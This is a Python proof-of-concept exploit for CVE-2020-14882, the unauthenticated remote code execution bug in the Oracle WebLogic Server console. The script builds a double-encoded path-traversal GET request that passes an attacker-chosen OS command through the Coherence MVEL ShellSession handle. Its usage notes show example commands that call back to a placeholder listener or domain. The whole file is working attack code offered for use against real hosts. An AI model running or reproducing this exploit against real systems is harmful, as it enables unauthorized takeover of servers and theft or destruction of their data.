#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import sys
import fire
from loguru import logger

import requests
from urllib3.exceptions import InsecureRequestWarning

class OracleWeblogic(object):
    """
    CVE: CVE-2020-14882 - Oracle Weblogic Server Unauthenticated via Get request - RCE
    Versions: 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0
    Exploit Author: Nguyen Jang

    Reference:
        https://www.exploit-db.com/exploits/48971
        https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/vulhub/Weblogic-%E7%AE%A1%E7%90%86%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-14882%2BCVE-2020-14883.md
        https://blog.csdn.net/weixin_45728976/article/details/109512848
        https://www.oracle.com/middleware/technologies/weblogic.html
        https://www.oracle.com/technetwork/middleware/downloads/index.html
        https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf

    Usage:
        python3 exploit.py http(s)://target:7001 command
        python3 exploit.py http(s)://target:7001 "nslookup your_Domain"
        python3 exploit.py http(s)://target:7001 "powershell.exe -c Invoke-WebRequest -Uri http://your_listener"
    """
    def __init__(self, target, command):
        """
        WebLogic Unauthenticated RCE via GET request

        Args:
            target (str): target url
            command (str): weblogic command
        """
        self.target = target
        self.command = command

    def exploit(self):
        request = requests.session()
        headers = {
            'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'
        }
        logger.info("Sending GET Request ....")

        api = f"/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('{self.command}');\");"
        response = request.get(self.target + api, verify = False, headers = headers)

if __name__ == '__main__':
    fire.Fire(OracleWeblogic)
